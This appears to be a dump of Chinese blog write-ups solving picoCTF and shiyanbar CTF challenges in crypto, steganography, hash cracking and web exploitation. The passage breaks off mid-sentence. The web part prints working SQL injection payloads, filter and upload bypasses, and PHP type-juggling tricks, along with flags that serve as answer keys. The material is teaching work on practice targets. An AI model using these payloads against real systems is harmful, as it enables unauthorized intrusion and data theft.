CIOEI DGFTB, AFR MITB IAR SOMMST YKGFM BAKR IOL YKWLMKAMTR EGSGK WFOJWT AZOSOMB COMI AFR OFROLHTFLAMT YGK MTAEI GMITK LMWROTL, AKT ACAKRL ZARUTL, HWZSOLITR ZTYGKT CTSS AL A YOKT UKGLL HSAFL CTKT GKOUOFASSB EIAKAEMTKL OF MIT LMKOH MG CIOEI LTTD MG OM CITF MTDHTKTR OF AFR IASSGCOFU MITB&apos;KT LODHSB RKACOFU OF UOXTL GF&quot; HKOFEOHAS LHOMMST ROLMGKM, KTARTKL EGDOEL AKT WLT, CAMMTKLGF MGGQ MCG 16-DGFMIL AYMTK KTLOLMAQTL A DGKT EKTAM RTAS MG EASXOF GYMTF IGZZTL MG ARDOML &quot;LSODB, &quot;ZWM OM&apos;L FADTR A FOUIM GWM LIT OL HGOFM GY FGM LTTF IGZZTL MIT ZGGQL AM MIAM O KTDAOFOFU ZGGQ IADLMTK IWTB AKT AHHTAKAFET: RTETDZTK 6, 1995 DGD&apos;L YKADTL GY EASXOF UOXTF A CAUGF, LGDTMODTL MIAM LG OM&apos;L YAMITKT&apos;L YADOSB FG EAFETSSAMOGFLIOH CAL HKTLTFML YKGD FGXTDZTK 21, 1985 SALM AHHTAK AZLTFET OF AFGMITKCOLT OM IAHHB MG KWF OM YGK MIOL RAR AL &quot;A SOMMST MG MGSTKAMT EASXOF&apos;L YADOSB RKACF ASDGLM EGDDTFRTR WH ZTOFU HTGHST OFLMAFET, UTM DAKKOTR ZB A RAFET EASXOF&apos;L GWMSAFROLOFU MIT FTCLHAHTK GK MAZSGOR FTCLHAHTK ZWLOFTLL LIGC OL GF!&quot; AFR LHKOFML GY EIOSRKTF&apos;L RAR&apos;L YKWLMKAMTR ZB MWKF IWDGK, CAL HWZSOE ROASGU MITKT&apos;L FGM DWEI AL &quot;&apos;94 DGRTKFOLD&quot; CAMMTKLGF IAL RTSOUIML GY YAFMALB SOYT CAMMTKLGF LABL LTKXTL AL AF AKMOLML OL RTLMKWEMOGF ZWLOFTLL, LHAETYAKTK GY MIT GHHGKMWFOMOTL BGW ZGMI A MGHOE YGK IOL IGDT MGFUWT-OF-EITTQ HGHWSAK MIAM OM CAL &quot;IGF&quot; AFR JWAKMTK HAUT DGKT LHAEOGWL EAFETSSAMOGF MIT HAOK AKT ESTAKSB OF HLBEIOE MKAFLDGUKOYOTK&apos;L &quot;NAH&quot; LGWFR TYYTEM BGW MIOFQTK CAMMTKLGF ASLG UKTC OFEKTROZST LHAET ZWBL OF EGDDGFSB CIOST GMITKCOLT OM&apos;L FADT OL FGMAZST LMGKBSOFT UAXT MIT GHHGKMWFOMOTL BGW EAFETSSAMOGF MIT &quot;EASXOF GYYTK MG DAQT IOD OFEGKKTEM AFLCTKL CAMMTK AKMCGKQ GMITK GYMTF CIOEI OL TXORTFM MG GMITK LMKOH OL MG MITOK WLT GY KWSTL MIAM LIGCF GF LAFROYTK, CIG WLTL A EKGCJWOSS ZT LTTF &quot;USWTR&quot; MG MIT GFSB HTKL AFR IOL YAMITK LWHHGKM OL SWFEISOFT UAXT MITLT MIOF A BTAK OF DWSMODAMTKOAS AFR GZMAOF GF LAFMALB, IOL WLT, CAMMTKL ROASGUWT OL AF &quot;AKMOLM&apos;L LMAMWL AL &quot;A ROD XOTC OF MIT TLLTFMOASSB MG DAQT IOD LTTD MG OFESWRTR MIAM EASXOF OL AF GRR ROASGUWT DGLM GY MIT ESWZ IAL TVHKTLLOGF GWMLORT AXAOSAZST MG substitution意思是代换，替代，猜测是简单的替代密码，可以直接用工具破解。 在线工具：http://quipqiup.com/ flag：IFONLYMODERNCRYPTOWASLIKETHIS Hash101题目：12345Prove your knowledge of hashes and claim a flag as your prize! Connect to the service at shell2017.picoctf.com:9661UPDATED 16:12 EST 1 Apr. HINTS All concepts required to complete this challenge, including simple modular math, are quickly found by googling :) 直接nc提供的地址和端口。12345678910111213141516windylh@shell-web:~$ nc shell2017.picoctf.com 9661 Welcome to Hashes 101! There are 4 Levels. Complete all and receive a prize! -------- LEVEL 1: Text = just 1&apos;s and 0&apos;s -------- All text can be represented by numbers. To see how different letters translate to numbers, go to http://www.asciitable.com/ TO UNLOCK NEXT LEVEL, give me the ASCII representation of 011011000110111101110110011001010110110001111001 &gt;lovely Correct! Completed level 1 level1就是简单的二进制转ascii码。12345678910111213141516171819------ LEVEL 2: Numbers can be base ANYTHING ----- Numbers can be represented many ways. A popular way to represent computer data is in base 16 or &apos;hex&apos; since it lines up with bytes very well (2 hex characters = 8 binary bits). Other formats include base64, binary, and just regular base10 (decimal)! In a way, that ascii chart represents a system where all text can be seen as &quot;base128&quot; (not including the Extended ASCII codes) TO UNLOCK NEXT LEVEL, give me the text you just decoded, lovely, as its hex equivalent, and then the decimal equivalent of that hex number (&quot;foo&quot; -&gt; 666f6f -&gt; 6713199) hex&gt;6c6f76656c79 Good job! 6c6f76656c79 to ASCII -&gt; lovely is lovely Now decimal dec&gt;119225983528057 Good job! 119225983528057 to Hex -&gt; 6c6f76656c79 to ASCII -&gt; lovely is lovely Correct! Completed level 2 level2就是将lovely的转成16进制和10进制，分别输入。1234567891011121314151617----------- LEVEL 3: Hashing Function ------------ A Hashing Function intakes any data of any size and irreversibly transforms it to a fixed length number. For example, a simple Hashing Function could be to add up the sum of all the values of all the bytes in the data and get the remainder after dividing by 16 (modulus 16) TO UNLOCK NEXT LEVEL, give me a string that will result in a 13 after being transformed with the mentioned example hashing function &gt;g incorrect. sum of all characters = 103 mod 16 = 7 does not equal 13 &gt;h incorrect. sum of all characters = 104 mod 16 = 8 does not equal 13 &gt;x incorrect. sum of all characters = 120 mod 16 = 8 does not equal 13 &gt;m Correct! Completed level 3 将输入的字符串的ascii码加和，和16取模，等于对应的数字即可。123456789101112131415161718192021222324Correct! Completed level 3 --------------- LEVEL 4: Real Hash --------------- A real Hashing Function is used for many things. This can include checking to ensure a file has not been changed (its hash value would change if any part of it is changed). An important use of hashes is for storing passwords because a Hashing Function cannot be reversed to find the initial data. Therefore if someone steals the hashes, they must try many different inputs to see if they can &quot;crack&quot; it to find what password yields the same hash. Normally, this is too much work (if the password is long enough). But many times, people&apos;s passwords are easy to guess... Brute forcing this hash yourself is not a good idea, but there is a strong possibility that, if the password is weak, this hash has been cracked by someone before. Try looking for websites that have stored already cracked hashes. TO CLAIM YOUR PRIZE, give me the string password that will result in this MD5 hash (MD5, like most hashes, are represented as hex digits): ac2f556a0eb415745b31e14a91d55d75 &gt;muc1d Correct! Completed level 4 You completed all 4 levels! Here is your prize: c3ee093f26ba147ccc451fd13c91ffce 给出一个md5，直接解出来就行。 flag:c3ee093f26ba147ccc451fd13c91ffce computeAES123Encrypted with AES in ECB mode. All values base64 encodedciphertext = R9TacKHy6cf1AZho/nwWWYaNzP5GfltKE5yW+kwRYe0LY+PdGk1hfoanS/iVZ7z1key = azdvtH4bvfdS/mryKLTNqQ== 题目说加密用了AES的ECB模式，并且用了base64编码。 直接用python脚本解码。 1234567891011import base64from Crypto.Cipher import AESkey=base64.b64decode(\"azdvtH4bvfdS/mryKLTNqQ==\") Ciphertext=base64.b64decode(\"R9TacKHy6cf1AZho/nwWWYaNzP5GfltKE5yW+kwRYe0LY+PdGk1hfoanS/iVZ7z1\")st=AES.new(key,AES.MODE_ECB)flag=st.decrypt(Ciphertext)print flag MASTER CHALLENGELazy Dev题目提示，输入password，先随便输入，返回Nah, that&#39;s not it，查看源代码，发现了一个js脚本。123456789101112131415161718192021222324252627//Validate the password. TBD!function validate(pword)&#123; //TODO: Implement me return false;&#125;//Make an ajax request to the serverfunction make_ajax_req(input)&#123; var text_response; var http_req = new XMLHttpRequest(); var params = \"pword_valid=\" + input.toString(); http_req.open(\"POST\", \"login\", true); http_req.setRequestHeader(\"Content-type\", \"application/x-www-form-urlencoded\"); http_req.onreadystatechange = function() &#123;//Call a function when the state changes. if(http_req.readyState == 4 &amp;&amp; http_req.status == 200) &#123; document.getElementById(\"res\").innerHTML = http_req.responseText; &#125; &#125; http_req.send(params);&#125;//Called when the user submits the passwordfunction process_password()&#123; var pword = document.getElementById(\"password\").value; var res = validate(pword); var server_res = make_ajax_req(res);&#125; 我们输入的password放在validate()函数中验证正确与否，但是validate函数只返回false，chrome的控制台可以调用js中的函数，我们直接赋值，让res=true，来绕过validate函数。 flag：client_side_is_the_dark_side0c97381c155aae62b9ce3c59845d6941","tags":[{"name":"WriteUp","slug":"WriteUp","permalink":"http://yoursite.com/tags/WriteUp/"},{"name":"CTF","slug":"CTF","permalink":"http://yoursite.com/tags/CTF/"}]},{"title":"实验吧(密码学、杂项、隐写部分)Writeup","date":"2017-09-17T16:00:00.000Z","path":"2017/09/18/实验吧(密码学、杂项、隐写部分)Writeup/","text":"这里没有key题目：http://www.shiyanbar.com/ctf/7 打开题目，js弹窗，这里没有key，查看源代码，在注释发现 &lt;!-- #@~^TgAAAA==&#39;[6*liLa6++p&#39;aXvfiLaa6i[[avWi[[a*p[[6*!I&#39;[6cp&#39;aXvXILa6fp[:6+Wp[:XvWi[[6+XivRIAAA==^#~@ --&gt;JScript/VBscript脚本加密，#@~^特征。 解密网址：http://www.dheart.net/decode/index.php flag：Encode@decode 压缩的问题题目：http://www.shiyanbar.com/ctf/26 12345678910111213141516Tips winrar, password crack, 65h -- 71h以下是一段16进制字符串 526172211A0700CF907300000D0000000000000056947424965E00600000004900000002E3B1696DEE413D3B1D33310020000000C3EBC6C6B2E2CAD44279CCECD2D76C6F76652E74787400796AD234784B6DD58B0A427929591366006C6F7665002E7478742E2E5B7A2D7B7D2E2E39423843569449C8691BEC768E16663C5F9ED737AE6CDDC6178C0837F6BB88DAA8356B02A700C776FC0F1091C1D16712FC075A011D5B5DEF7E46966E8B878B80DABCDF9683C49165FFB993A77CDE8600A1262200F3D3D5315DF0FC4E2B3ACAA3943F142EC43D7B00400700key是解压后的txt文件的sha1值(取前8位) 用winhex将16进制的字符串存储为rar格式，用winrar打开，发现有密码，猜测65h -- 71h部分是解压密码，将对应部分复制出来..[z-{}..9B8C，解压，得到txt，放入hash验证工具得到SHA1: 58A09AE43E5A9DF9AD5E89F90C1BB7430DC5BD02 flag：58a09ae4 so beautiful so white题目：http://www.shiyanbar.com/ctf/1904 解压得到一个图片和加密压缩包，图片表面看是纯白的，放入stegsolve，换了几个通道发现了key{forensics_is_fun}。 猜测是解压密码。解压得到一个gif图片，但是发现打不开。 查看16进制，发现文件头缺少了一部分。 将文件头补全GIF90a得到flag。 flag:CTF{AS3X} 小case题目：http://www.shiyanbar.com/ctf/16 给出的字符串nick:1003:8EA9109FDA91D6BFC6EBE8776A153FEB:C6002D00F57F9F399B6263D714AF8C3A::: 可以看出是User Name:User ID:LM Hash:NT Hash:::这种形式，在http://www.objectif-securite.ch/en/ophcrack.php，解密LM Hash，即可得到密码，用nick用户登录就是flag flag：#AttackIsNotEnough# 复杂的QR_code题目：http://www.shiyanbar.com/ctf/1856 扫描二维码，提示secret is here。binwalk分析发现有一个zip文件，binwalk -e直接提取。 打开zip，里面有加密的4number.txt，估计是提示4位密码，用爆破工具爆破，密码是7639，解压得到flag。 flag：CTF{vjpw_wnoei} 刷新 刷新 快刷新题目：http://www.shiyanbar.com/ctf/1938 下载图片123456.jpg，binwalk等分析，并没有发现隐藏文件，题目提示刷新，猜测是F5隐写。 F5隐写工具 java Extract 12346.jpg -p 123456 查看工具目录下生成的output.txt，就是flag。 flag：flag{F5_f5_F5_Ez!!!} 雌黄出其唇吻题目：http://www.shiyanbar.com/ctf/1838 标准的套路题。。。。 打开题目，发现一个base64编码的字符串，多次刷新发现都不一样，是随机生成的。 访问robots.txt，看到一些禁止的目录和php页面，都无法访问，看到旁边的页面滚动条，发现最下端还有一行。。。 Sitemap: ./sitemap87591u096080.xml 访问。1234567891011121314&lt;urlset xmlns=\"http://www.sitemaps.org/schemas/sitemap/0.9\"&gt;&lt;url&gt;&lt;loc&gt;./index.php&lt;/loc&gt;&lt;lastmod&gt;2015-12-25&lt;/lastmod&gt;&lt;changefreq&gt;monthly&lt;/changefreq&gt;&lt;priority&gt;0.8&lt;/priority&gt;&lt;/url&gt;&lt;url&gt;&lt;loc&gt;./flag1241098092ewiuqu9t53.php&lt;/loc&gt;&lt;lastmod&gt;2015-12-25&lt;/lastmod&gt;&lt;changefreq&gt;monthly&lt;/changefreq&gt;&lt;priority&gt;0.8&lt;/priority&gt;&lt;/url&gt;&lt;/urlset&gt; 访问/flag1241098092ewiuqu9t53.php，得到base64编码的字符串，解密就是flag。 flag：CTF{robots_could_leak_information} Windows题目：http://www.shiyanbar.com/ctf/1784 一道视频隐写题，提示不再闪烁的窗户，不再模糊的声音。 视频的音频很诡异，感觉像是倒放的。用Vegas软件将音频部分反转，得到了一段英文数字51324984652187698521487459648201,(听了好久。。。) 视频不再闪烁，也就是将闪烁的东西放在一起，得到一张二维码。 扫描xorwith313 最后应该是音频的数字和313异或。 flag：51324984652187698521487459648496 base??题目：http://www.shiyanbar.com/ctf/1782 下载文件得到一个rar压缩包，解压得到加密代码。123456789101112131415161718import base64def change(ch): if ord(ch)&lt;92: return chr(ord(ch)+32) else: return chr(ord(ch)-32) if __name__ == '__main__': flag='?????' rawstr=base64.b64encode(flag) finalstr='' for i in range(0,len(rawstr)): if ord(rawstr[i])&gt;96 and ord(rawstr[i])&lt;123: finalstr+=change(rawstr[i]) else: finalstr+=rawstr[i] print rawstr print finalstr 明文base64加密之后将小写字母全部变为大写，题目只给出了密文和明文的MD5值，只能用脚本暴力破解。(运用python的itertools进行生成) 123456789101112131415161718192021# -*-coding: utf-8 -*-import hashlibimport itertoolsimport base64def check(str): m1 = hashlib.md5(str).hexdigest() if m1 == '16478a151bdd41335dcd69b270f6b985': return True else: return Falselist1=itertools.product(['Y','y'],['M','m'],['F','f'],['Z','z'],['Z','z'],['T','t'],['Y','y'],['0'],['D','d'],['3'],['R','r'],['M','m'],['D','d'],['3'],['R','r'],['M','m'],['M','m'],['T','t'],['I','i'],['Z','z'])for i in list1: str1=''.join(i) if check(base64.b64decode(str1)): print \"The Flag is \"+base64.b64decode(str1) break else: print \"not \"+str1 flag:base64wtfwtf123 黑客叔叔（雨袭团）内部交流题（第一季1.0.1）题目:http://www.shiyanbar.com/ctf/741 打开题目给出base64编码的dW1mcGJsamhhd3Jmcm14aHoxOXptZjltZWducm13NDV4M2RvbmhxfDAxfDAzfDA3fCt8KzF8KzN8Kzd8MisxfDIrMnwyKzZ8Mis3fDIrOXwzKzB8MyszfDMrN3wzKzh8Mys5fD98 解码得umfpbljhawrfrmxhz19zmf9megnrmw45x3donhq|01|03|07|+|+1|+3|+7|2+1|2+2|2+6|2+7|2+9|3+0|3+3|3+7|3+8|3+9|?| 估计是base64对应位数变成大写。 123456#-*- coding:utf-8 -*- string=' umfpbljhawrfrmxhz19zmf9megnrmw45x3donhq' for i in (1,3,7,10,11,13,17,21,22,26,27,29,30,33,37,38,39): str=string[i].upper() string=string[0:i]+str+string[i+1:] print string 得到字符串UmFpblJhaWRfRmxhZ19zMF9meGNrMW45X3doNH，base64解码得到flag。 flag:RainRaid_Flag_s0_fxck1n9_wh4 疑惑的汉字题目：http://www.shiyanbar.com/ctf/1876 当铺密码 这题是当铺密码的例子，密文王夫 井工 夫口 由中人 井中 夫夫 由中大，文字出头几画就代表数字几。 67 84 70 123 82 77 125转为asciiCTF{RM} flag：CTF{RM} Fair-Play题目:http://www.shiyanbar.com/ctf/1852 Fairplay加密 12The quick brown fox jumps over the lazy dog! ihxo&#123;smzdodcikmodcismzd&#125; The quick brown fox jumps over the lazy dog!就是生成密码表的密钥，ihxo{smzdodcikmodcismzd}是密文。 Fairplay在线解密 flag：ctfx{playfairisfairplay} js题目：http://www.shiyanbar.com/ctf/1779 打开题目是js的代码1eval(function(p,a,c,k,e,d)&#123;e=function(c)&#123;return(c&lt;a?\"\":e(parseInt(c/a)))+((c=c%a)&gt;35?String.fromCharCode(c+29):c.toString(36))&#125;;if(!''.replace(/^/,String))&#123;while(c--)d[e(c)]=k[c]||e(c);k=[function(e)&#123;return d[e]&#125;];e=function()&#123;return'\\\\w+'&#125;;c=1;&#125;;while(c--)if(k[c])p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c]);return p;&#125;('&lt;1 8=\"7/a\"&gt;9(\\'\\\\6\\\\3\\\\2\\\\5\\\\4\\\\b\\\\i\\\\h\\\\k\\\\j\\\\0\\\\g\\\\d\\\\c\\\\f\\\\0\\\\e\\')&lt;/1&gt;',21,21,'u0065|script|u006d|u0069|u0054|u0043|u0053|text|type|alert|javascript|u0046|u006f|u0063|u007d|u0064|u006e|u006a|u007b|u005f|u0073'.split('|'),0,&#123;&#125;)) 最后的text，type，alert很可疑。 不是很懂js，直接丢控制台，把eval改成console.log()，用来在控制台输出，然后得到unicode编码。 &lt;script type=&quot;text/javascript&quot;&gt;alert(&#39;\\u0053\\u0069\\u006d\\u0043\\u0054\\u0046\\u007b\\u006a\\u0073\\u005f\\u0065\\u006e\\u0063\\u006f\\u0064\\u0065\\u007d&#39;)&lt;/script&gt; 把alert内的东西放到网站解码，得到flag。 flag：SimCTF{js_encode} 黑客叔叔（雨袭团）内部交流题（第一季1.0.2）题目：http://www.shiyanbar.com/ctf/1744 123456U2FsdGVkX18vmjE0tvWk69T女B神u9inuiNnM3rBhsu6tXzLhu+iofwuHNHq3YtDKs8ZlYLvSZuUY+mxLRKO7+m254R5YTCW8yzzgD+mGwWfGRgqmPKdD你xA等等hint:女神你等等？ 很有脑洞qwq，并没看出啥来，偷偷看一眼writeup，等等换成==，其他汉字换成/12345U2FsdGVkX18vmjE0tvWk69T/B/u9inuiNnM3rBhsu6tXzLhu+iofwuHNHq3YtDKs8ZlYLvSZuUY+mxLRKO7+m254R5YTCW8yzzgD+mGwWfGRgqmPKdD/xA== 看起来像是之前做的TripleDes，尝试解密。 U2FsdGVkX19RFyuUWyBHLNo8ldVPSkFpTB/lG07bZIL1rSAa/L0jFRGdvPh//8W4uZHe 这个就尝试了很多，最后试出来是Rabbit解密。 附上在线解密网址http://tool.oschina.net/encrypt flag：RainRaid_Flag_Rabbit&amp;TripleDes_Nice simple algorithm题目：http://www.shiyanbar.com/ctf/737 下载zip包，里面有一个python的加密脚本和一个加密后字符串的enc.txt。1234567891011121314151617181920212223242526272829303132#!/usr/bin/pythonflag = '[censored]'hflag = flag.encode('hex')iflag = int(hflag[2:], 16)def FAN(n, m): i = 0 z = [] s = 0 while n &gt; 0: if n % 2 != 0: z.append(2 - (n % 4)) else: z.append(0) n = (n - z[i])/2 i = i + 1 z = z[::-1] l = len(z) for i in range(0, l): s += z[i] * m ** (l - 1 - i) return si = 0r = ''while i &lt; len(str(iflag)): d = str(iflag)[i:i+2] nf = FAN(int(d), 3) r += str(nf) i += 2print r 加密流程为将明文转换为16进制编码，在转化为10进制数，将每两位数字构成的数进行FAN函数运算，再拼接起来得到密文。 所以解密流程是：将0~99利用FAN函数求得加密值，建立加密值到原数的字典，在明文中查字典拼接得到10进制数，转化为16进制数，再求取字符串。 解密脚本：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#-*- coding: utf-8 -*-def FAN(n, m): i = 0 z = [] s = 0 while n &gt; 0: if n % 2 != 0: z.append(2 - (n % 4)) else: z.append(0) n = (n - z[i])/2 i = i + 1 z = z[::-1] l = len(z) for i in range(0, l): s += z[i] * m ** (l - 1 - i) return ss='2712733801194381163880124319146586498182192151917719248224681364019142438188097307292437016388011943193619457377217328473027324319178428'#构造0~99对应的FAN()的值的字典dct=&#123;&#125;for n in xrange(0,100): #key为FAN()的结果，value为n(位数补足到2位) dct[str((FAN(n,m=3)))]=\"%02d\"%nlst=[]offset=0while offset&lt;len(s): #先从4个字符匹配直至1个字符 for i in xrange(4,0,-1): tmp=s[offset:offset+i] if tmp in dct: lst.append(dct[tmp]) offset+=i breakflag=\"\".join(lst)#python中s[i:i+2]不一定取到2个字符，#如s=\"pcat\",s[3:4]和s[3:5],甚至s[3:100]都是\"t\"#此题中最后得到\"09\"，但也可能是\"9\"，故做下面的判断if len(hex(long(flag))[2:-1])%2!=0: flag=flag[:-2]+flag[-1]flag=hex(long(flag))[2:-1].decode('hex')print flag flag：SIS{a9ab115c488a311896dac4e8bc20a6d7} 传统知识+古典密码题目：http://www.shiyanbar.com/ctf/1991 123小明某一天收到一封密信，信中写了几个不同的年份 辛卯，癸巳，丙戌，辛未，庚辰，癸酉，己卯，癸巳。 信的背面还写有“+甲子”，请解出这段密文。 看起来挺新颖的，传统知识+古典密码。既然说了是年份，那就是天干地支纪年法对应的年份，还要+甲子，也就是加60，所以密文变成88 90 93 68 77 70 76 90，转成ascii码也就是XZSDMFLZ。 传统知识用完了，就是古典密码了。古典密码很多，这里用的是栅栏密码和凯撒移位密码。 栅栏密码（两栏）得到XMZFSLDZ凯撒移位得到：SHUANGYU flag：CTF{SHUANGYU} 数码管题目:http://www.shiyanbar.com/ctf/55 题目是一张图片 显然flag就是DUTCTF{xxx}，关键是根据图片解出XXX。 数码管的十六进制表示方式，分别将每个数码管中的字形转化为相应的十六进制，这里还要分共阳极、共阴极。得到flag。 数码管布局 常见字形与其十六进制编码 题目中字形的编码 尝试后发现，题目中红色的为共阳极数码管，蓝色的为共阴极数码管。 flag：DUTCTF{8979C738C0} deeeeeeaaaaaadbeeeeeeeeeef-200题目：http://www.shiyanbar.com/ctf/1983 binwalk分析，并没有什么特别的。 用ue编辑器查看16进制，也没发现什么有用的信息。 看了大佬的writeup，16进制下可以看到照片的iphone5照的，iphone5照的最高分辨率是3264x2448，而图片是3264x1681，所以想要解题需要修改分辨率。 分辨率位置： 将06 91修改为09 91即可得到flag。 flag:Key{TheISISPasswordIs}","tags":[{"name":"WriteUp","slug":"WriteUp","permalink":"http://yoursite.com/tags/WriteUp/"},{"name":"CTF","slug":"CTF","permalink":"http://yoursite.com/tags/CTF/"}]},{"title":"实验吧(Web部分)Writeup","date":"2017-09-14T16:00:00.000Z","path":"2017/09/15/实验吧(Web部分)Writeup/","text":"PHP大法题目：http://www.shiyanbar.com/ctf/54 提示访问index.php.txt 1234567891011121314151617&lt;?phpif(eregi(\"hackerDJ\",$_GET[id])) &#123; echo(\"&lt;p&gt;not allowed!&lt;/p&gt;\"); exit();&#125;$_GET[id] = urldecode($_GET[id]);if($_GET[id] == \"hackerDJ\")&#123; echo \"&lt;p&gt;Access granted!&lt;/p&gt;\"; echo \"&lt;p&gt;flag: *****************&#125; &lt;/p&gt;\";&#125;?&gt;&lt;br&gt;&lt;br&gt;Can you authenticate to this website? 和XMAN的urlencode差不多的思路，不过XMAN的题目并没有给源码。 url编码会自动解码一次，所以需要将id变量的值进行两次urlencode。 payload：?id=%25%36%38%25%36%31%25%36%33%25%36%62%25%36%35%25%37%32%25%34%34%25%34%61 flag:DUTCTF{PHP_is_the_best_program_language} NSCTF web200题目：http://www.shiyanbar.com/ctf/1760 题目给出图片。 直接写解密脚本12345678910111213141516171819202122232425import base64s='a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws'flag=''for i in s: if((ord(i)&gt;=ord('A') and ord(i)&lt;=ord('Z')) or (ord(i)&gt;=ord('a') and ord(i)&lt;=ord('z'))): if(ord(i)-13&lt;ord('A') and ord(i)&gt;=ord('A') and ord(i)&lt;=ord('Z')): flag+=chr(ord(i)+13) elif(ord(i)-13&lt;ord('a') and ord(i)&gt;=ord('a') and ord(i)&lt;=ord('z')): flag+=chr(ord(i)+13) else: flag+=chr(ord(i)-13) else: flag+=i;flag=flag[::-1]s=''flag=base64.b64decode(flag)for i in range(len(flag)): s+=chr(ord(flag[i])-1)s=s[::-1]print s flag:flag:{NSCTF_b73d5adfb819c64603d7237fa0d52977} 忘记密码了题目：http://www.shiyanbar.com/ctf/1808 进入网站step1.php，查看源代码，发现一句&lt;meta name=&quot;editor&quot; content=&quot;Vim&quot; /&gt; vim编辑，可能存在.xxxx.php.swp的备份文件。尝试了.step1.php.swp、.step2.php.swp，都是404，查看step2.php的源码，发现有一个Submit.php，直接访问，提示you are not an admin，访问.submit.php.swp，果然存在，源码如下12345678910111213if(!empty($token)&amp;&amp;!empty($emailAddress))&#123; if(strlen($token)!=10) die('fail'); if($token!='0') die('fail'); $sql = \"SELECT count(*) as num from `user` where token='$token' AND email='$emailAddress'\"; $r = mysql_query($sql) or die('db error'); $r = mysql_fetch_assoc($r); $r = $r['num']; if($r&gt;0)&#123; echo $flag; &#125;else&#123; echo \"you are not an admin\"; &#125;&#125; 邮箱为admin的邮箱，要求token长度为10，且token需要等于零。 邮箱在step1.php中有提到&lt;meta name=&quot;admin&quot; content=&quot;admin@simplexue.com&quot; /&gt; token验证可以用php中的0exxxxxxxx绕过。 payload：?emailAddress=admin@simplexue.com&amp;token=0e11111111 flag：SimCTF{huachuan_TdsWX} 这个看起来有点简单!题目:http://www.shiyanbar.com/ctf/33 访问题目地址，给出了一个带?id=1的地址，和一个表格，猜测sql注入。 用常用的&#39;,and 1=1,and 1=2,判断存在sql注入。 表格有两列，所以判断数据库中也是两列。 查询数据库名?id=1 union select 1,concat(database()) --，得到库名my_db。 查询数据库表名?id=1 union select 1,concat(table_name) from information_schema.tables where table_schema=database() --，得到两个表名，news,thiskey 查询thiskey表的字段名?id=1 union select 1,concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;thiskey&#39; --，查到字段k0y 爆出字段k0y?id=1 union select 1,concat(k0y) from thiskey --,得到flag。 flag：whatiMyD91dump 上传绕过题目：http://www.shiyanbar.com/ctf/1781 题目要求上传一个jpg,gif,png格式的文件，但是上传之后有要求是php格式。 上传绕过，在filename后加%00.jpg，在Hex视图下修改目录后空格的20为00，即可绕过。 flag:flag{SimCTF_huachuan} 天网管理系统题目：http://www.shiyanbar.com/ctf/1810 查看源代码，有注释。1&lt;!-- $test=$_GET[&apos;username&apos;]; $test=md5($test); if($test==&apos;0&apos;) --&gt; 让username的MD5和0相等，可以让MD5以0e开头。 0e开头的MD5总结 username输入QNKCDZO，得到/user.php?fame=hjkleffifer，访问页面看到一段php源码。 123456$unserialize_str = $_POST['password']; $data_unserialize = unserialize($unserialize_str); if($data_unserialize['user'] == '???' &amp;&amp; $data_unserialize['pass']=='???') &#123; print_r($flag); &#125; 这段php将post的password值进行了反序列化，得到了一个数组，将数组的user和pass的值和???进行了比较。比较用到了php的弱类型，bool类型的true跟任意字符串可以弱类型相等*。 payload:post：a:2:{s:4:&quot;user&quot;;b:1;s:4:&quot;pass&quot;;b:1;} flag:ctf{dwduwkhduw5465} Once More题目：http://www.shiyanbar.com/ctf/1805 php审计题，源码如下。1234567891011121314151617181920212223&lt;?phpif (isset ($_GET['password'])) &#123; if (ereg (\"^[a-zA-Z0-9]+$\", $_GET['password']) === FALSE) &#123; echo '&lt;p&gt;You password must be alphanumeric&lt;/p&gt;'; &#125; else if (strlen($_GET['password']) &lt; 8 &amp;&amp; $_GET['password'] &gt; 9999999) &#123; if (strpos ($_GET['password'], '*-*') !== FALSE) &#123; die('Flag: ' . $flag); &#125; else &#123; echo('&lt;p&gt;*-* have not been found&lt;/p&gt;'); &#125; &#125; else &#123; echo '&lt;p&gt;Invalid password&lt;/p&gt;'; &#125;&#125;?&gt; ereg()函数用%00来截断，password变量的长度要小于8，且大于9999999，用科学记数法，即9e9=910^9，最后加上`-*`即可 payload:?password=9e9%00*-* flag:CTF{Ch3ck_anD_Ch3ck} 简单的sql注入题目：http://www.shiyanbar.com/ct f/1875 题目给出了常见的?id=1参数，下面有id的返回值和name的返回值，我们可以通过id的输出来判断到底过滤了什么。 输入union select的时候，union消失了。再加空格之后select也消失了。猜测是过滤了空格，将两个空格中间的字符一起删除。 空格可以使用/**/、()过滤，构造?id=1/**/union/**/select/**/flag/**/from/**/flag/**/where/**/&#39;1&#39;=&#39;1，ID部分正常回显，说明可以绕过，单引号闭合就是payload。 payload：?id=1&#39;/**/union/**/select/**/flag/**/from/**/flag/**/where/**/&#39;1&#39;=&#39;1 flag：flag{Y0u_@r3_5O_dAmn_90Od} 天下武功唯快不破题目：http://www.shiyanbar.com/ctf/1854 打开网页，查看源代码，获得提示&lt;!-- please post what you find with parameter:key --&gt;，让我们post参数key。 抓包发现header头中有经过base64编码的flag参数，将参数解码P0ST_THIS_T0_CH4NGE_FL4G:9x3PyMMd9，将参数9x3PyMMd9post却没有结果，题目中说尽快的提交，猜测与时间有关，用python脚本解决。 123456789101112131415# -*- coding:utf-8 -*-import requestsimport base64url='http://ctf5.shiyanbar.com/web/10/10.php'response=requests.get(url)head=response.headersflag=base64.b64decode(head['flag']).split(':')[1]print flagpost=&#123;\"key\":flag&#125;result=requests.post(url=url, data=post) print result.text flag：CTF{Y0U_4R3_1NCR3D1BL3_F4ST!} Forbidden题目：http://www.shiyanbar.com/ctf/21 页面提示Make sure you are in HongKong。 直接用burpsuit抓包，修改Accept-Language:的值zh-hk，重放即可得到flag。 flag：123JustUserAGent 简单的sql注入之2题目：http://www.shiyanbar.com/ctf/1908 用?id=1 and 1=1测试，返回SQLi detected!，这是过滤了and？又尝试了很多关键字，都返回SQLi detected!，那可能是过滤了空格。 用/**/绕过对空格的过滤，构造测试payload?id=1/**/union/**/select/**/flag/**/from/**/flag/**/where/**/1=1发现正常回显，用单引号闭合就是payload。 payload：?id=1&#39;/**/union/**/select/**/flag/**/from/**/flag/**/where/**/&#39;1&#39;=&#39;1 flag：flag{Y0u_@r3_5O_dAmn_90Od} 简单的sql注入之3题目：http://www.shiyanbar.com/ctf/1909 与前两题类似，也是get参数id进行查询。 输入?id=1，页面正常输出hello，?id=0页面不输出。 输入?id=’页面直接报SQL语法错误。 输入?id=1 and 1=2页面正常 ?id=1’ and 